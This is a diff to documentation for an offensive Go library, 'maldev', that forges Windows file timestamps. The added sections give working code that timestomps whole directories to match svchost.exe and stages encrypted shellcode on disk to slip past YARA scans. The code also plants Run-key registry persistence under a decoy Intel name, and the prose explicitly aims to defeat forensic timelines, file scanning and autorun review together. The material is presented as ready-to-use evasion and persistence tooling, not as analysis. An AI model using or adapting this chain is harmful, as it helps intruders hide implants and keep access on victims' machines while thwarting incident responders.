@@ -7,7 +7,7 @@
 
 ---
 
-## For Beginners
+## Primer
 
 Every file on Windows has three timestamps: creation time, last access time, and last modification time. Forensic investigators use these timestamps to build timelines of attacker activity -- "this file was created at 2:00 AM, which matches the breach window."
 
@@ -103,7 +103,56 @@ err := timestomp.SetFull(`C:\temp\implant.exe`, creation, access, modified)
 
 ---
 
-## Combined Example: Drop + Timestomp + Execute
+## Advanced — Directory Walk with Neighbour Matching
+
+A single timestomped file stands out if everything around it has a recent
+`Modified` date. Walking the target directory and aligning every dropped
+artifact with the `Modified` time of a long-lived neighbour blends the
+whole tree.
+
+```go
+package main
+
+import (
+    "io/fs"
+    "os"
+    "path/filepath"
+    "time"
+
+    "github.com/oioio-space/maldev/cleanup/timestomp"
+)
+
+// blendInto timestomps every file under dir so its three timestamps match
+// `anchor` — pick an anchor that existed long before the dropper ran.
+func blendInto(dir string, anchor string) error {
+    info, err := os.Stat(anchor)
+    if err != nil {
+        return err
+    }
+    t := info.ModTime()
+    return filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
+        if err != nil || d.IsDir() {
+            return err
+        }
+        // SetFull with identical ctime/atime/mtime — matches how most Windows
+        // installer outputs look after an uneventful lifetime on disk.
+        return timestomp.SetFull(path, t, time.Now(), t)
+    })
+}
+
+func main() {
+    _ = blendInto(`C:\ProgramData\Intel\Graphics`, `C:\Windows\System32\svchost.exe`)
+}
+```
+
+---
+
+## Combined Example — Encrypted Drop + Timestomp + Registry Persistence
+
+Three maldev layers stacked so a defender's triage passes all fail at once:
+AES-GCM turns the on-disk artifact into opaque bytes, timestomping hides it
+from MFT / `dir /tq` date sorts, and `HKCU\...\Run` survives reboots without
+touching SCM or Task Scheduler.
 
 ```go
 package main
@@ -113,25 +162,40 @@ import (
     "time"
 
     "github.com/oioio-space/maldev/cleanup/timestomp"
+    "github.com/oioio-space/maldev/crypto"
+    "github.com/oioio-space/maldev/persistence/registry"
 )
 
 func main() {
-    // Drop payload to disk
-    payload := []byte{/* ... */}
-    targetPath := `C:\Windows\Temp\svchost-update.exe`
-    os.WriteFile(targetPath, payload, 0644)
+    const drop = `C:\Users\Public\Intel\gfx-cache.bin`
 
-    // Timestomp to match legitimate svchost.exe
-    timestomp.CopyFromFull(`C:\Windows\System32\svchost.exe`, targetPath)
+    // 1. Encrypt payload. Any YARA file-scan now sees only ciphertext.
+    key, _ := crypto.NewAESKey()
+    payload := []byte{ /* raw shellcode */ }
+    blob, _ := crypto.EncryptAESGCM(key, payload)
 
-    // Alternative: set to a specific historical date
-    // timestomp.SetFull(targetPath,
-    //     time.Date(2019, 12, 7, 9, 0, 0, 0, time.UTC),
-    //     time.Date(2024, 2, 1, 8, 0, 0, 0, time.UTC),
-    //     time.Date(2019, 12, 7, 9, 0, 0, 0, time.UTC),
-    // )
+    _ = os.MkdirAll(`C:\Users\Public\Intel`, 0o755)
+    _ = os.WriteFile(drop, blob, 0o644)
+
+    // 2. Timestomp — match svchost.exe so date-sorted triage views drop it
+    //    into the middle of the system-file pack.
+    _ = timestomp.CopyFromFull(`C:\Windows\System32\svchost.exe`, drop)
+
+    // 3. Persist via HKCU — no admin prompt, no SCM noise.
+    _ = registry.RunKey(
+        registry.HiveCurrentUser,
+        registry.KeyRun,
+        "IntelGraphicsCache",
+        drop, // launcher reads blob, decrypts, self-injects
+    ).Install()
+
+    _ = time.Now
 }
 ```
+
+Layered benefit: each of the three defences (file scan / timeline analysis /
+autorun review) has to fire independently. Bypassing all three at once is
+what makes the chain effective, not any single step.
 
 ---
 
